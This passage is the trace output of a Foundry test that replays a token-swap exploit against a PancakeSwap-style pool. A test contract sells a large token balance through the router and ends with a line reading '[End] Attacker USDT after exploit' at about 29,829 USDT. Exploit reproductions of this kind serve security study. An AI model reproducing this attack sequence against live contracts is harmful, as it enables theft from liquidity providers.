    ├─ [560] 0x523aA213FE806778Ffa597b6409382fFfcc12De2::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 11355984196006908647272347 [1.135e25]
    ├─ [24651] 0x523aA213FE806778Ffa597b6409382fFfcc12De2::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 11355984196006908647272347 [1.135e25])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 11355984196006908647272347 [1.135e25])
    │   ├─  storage changes:
    │   │   @ 0x40efe119f1031eb281b5b195ed42e00327d441da2528f3ffaa1e7fa89579fa7f: 0 → 0x0000000000000000000000000000000000000000000964b923056563beb16f9b
    │   └─ ← [Return] true
    ├─ [42130] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForTokensSupportingFeeOnTransferTokens(11355984196006908647272347 [1.135e25], 0, [0x523aA213FE806778Ffa597b6409382fFfcc12De2, 0x55d398326f99059fF775485246999027B3197955], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1715433330 [1.715e9])
    │   ├─ [14083] 0x523aA213FE806778Ffa597b6409382fFfcc12De2::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xBb33668bAe76A6394683DeEf645487e333b8fC45, 11355984196006908647272347 [1.135e25])
    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 0)
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x000000000000000000000000000000000000dEaD, value: 113559841960069086472723 [1.135e23])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x7367E49979e1b3e616976729Bef602C3823BCACC, value: 227119683920138172945446 [2.271e23])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xBb33668bAe76A6394683DeEf645487e333b8fC45, value: 11015304670126701387854178 [1.101e25])
    │   │   ├─  storage changes:
    │   │   │   @ 0xeb175cd2ae5c9b33c5673958c7389d9b7c1e82f9332f251e5ca03ad51c438c7d: 0x000000000000000000000000000000000000000000000645b76f0cd6f9b9ed77 → 0x0000000000000000000000000000000000000000000922da9448c3aaed941ed9
    │   │   │   @ 0xb34209a263f6c38fe55f099e9e70f9d67e93982480ff3234a5e0108028ad164d: 0x000000000000000000000000000000000000000000000c7c3297a0097da6fe3c → 0x00000000000000000000000000000000000000000000248849fb84e41699684f
    │   │   │   @ 0x40efe119f1031eb281b5b195ed42e00327d441da2528f3ffaa1e7fa89579fa7f: 0x0000000000000000000000000000000000000000000964b923056563beb16f9b → 0
    │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x0000000000000000000000000000000000000000000964b923056563beb16f9b → 0
    │   │   │   @ 0x76eef8b955b7075197d325b783f34cd8a18e9e66dab9f3a1a09b4e4874177f81: 0x0000000000000000000000000000000000000000000000215fe951fe25733a06 → 0x0000000000000000000000000000000000000000000030398eb11bb357580e2c
    │   │   └─ ← [Return] true
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 100000000000000000000 [1e20]
    │   ├─ [893] 0xBb33668bAe76A6394683DeEf645487e333b8fC45::getReserves() [staticcall]
    │   │   └─ ← [Return] 29620242035852638285175 [2.962e22], 29809261709493690047992 [2.98e22], 1715433330 [1.715e9]
    │   ├─ [560] 0x523aA213FE806778Ffa597b6409382fFfcc12De2::balanceOf(0xBb33668bAe76A6394683DeEf645487e333b8fC45) [staticcall]
    │   │   └─ ← [Return] 11044924912162554026139353 [1.104e25]
    │   ├─ [18390] 0xBb33668bAe76A6394683DeEf645487e333b8fC45::swap(0, 29729119514728633925548 [2.972e22], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 29729119514728633925548 [2.972e22])
    │   │   │   ├─ emit Transfer(from: 0xBb33668bAe76A6394683DeEf645487e333b8fC45, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 29729119514728633925548 [2.972e22])
    │   │   │   ├─  storage changes:
    │   │   │   │   @ 0xeb175cd2ae5c9b33c5673958c7389d9b7c1e82f9332f251e5ca03ad51c438c7d: 0x00000000000000000000000000000000000000000000064ff69bd48c10e21df8 → 0x00000000000000000000000000000000000000000000000458324586fb571e4c
    │   │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x0000000000000000000000000000000000000000000000056bc75e2d63100000 → 0x0000000000000000000000000000000000000000000006510a30ed32789affac
    │   │   │   └─ ← [Return] true
    │   │   ├─ [560] 0x523aA213FE806778Ffa597b6409382fFfcc12De2::balanceOf(0xBb33668bAe76A6394683DeEf645487e333b8fC45) [staticcall]
    │   │   │   └─ ← [Return] 11044924912162554026139353 [1.104e25]
    │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0xBb33668bAe76A6394683DeEf645487e333b8fC45) [staticcall]
    │   │   │   └─ ← [Return] 80142194765056122444 [8.014e19]
    │   │   ├─ emit Sync(reserve0: 11044924912162554026139353 [1.104e25], reserve1: 80142194765056122444 [8.014e19])
    │   │   ├─ emit Swap(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0In: 11015304670126701387854178 [1.101e25], amount1In: 0, amount0Out: 0, amount1Out: 29729119514728633925548 [2.972e22], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   ├─  storage changes:
    │   │   │   @ 8: 0x663f6f7200000000064ff69bd48c10e21df8000000000645b76f0cd6f9b9ed77 → 0x663f6f7200000000000458324586fb571e4c0000000922da9448c3aaed941ed9
    │   │   └─ ← [Stop]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 29829119514728633925548 [2.982e22]
    │   └─ ← [Stop]
    ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 29829119514728633925548 [2.982e22]
    ├─ emit log_named_decimal_uint(key: "[End] Attacker USDT after exploit", val: 29829119514728633925548 [2.982e22], decimals: 18)
    ├─  storage changes:
    │   @ 0x40efe119f1031eb281b5b195ed42e00327d441da2528f3ffaa1e7fa89579fa7f: 0 → 0x0000000000000000000000000000000000000000000964b923056563beb16f9b
    │   @ 0x4f865b326ab64d28b6f68c91cb64f2c44343859d9a28422fadeac14ffdebd5d4: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    │   @ 12: 0 → 1
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 10.31s (8.47s CPU time)

Ran 2 test suites in 11.37s (10.84s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
